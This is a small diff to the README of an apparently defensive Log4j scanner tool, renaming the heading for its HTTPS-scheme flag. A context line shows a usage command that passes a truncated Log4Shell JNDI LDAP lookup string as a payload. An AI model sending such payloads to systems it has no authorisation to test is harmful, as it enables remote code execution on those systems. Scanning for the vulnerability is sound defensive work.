@@ -145,7 +145,7 @@ python3 scanForLog4jVulnerability.py -f ./domains.txt -p '${jndi:ldap://log4shel
 ```
 
 
-## Schemes -s or --https (optional)
+## HTTPS Scheme -s or --https (optional)
 
 If you have host names with no scheme specified, then this flag will prepend https:// to all of your hosts in your domains.txt file. Default is false.
 
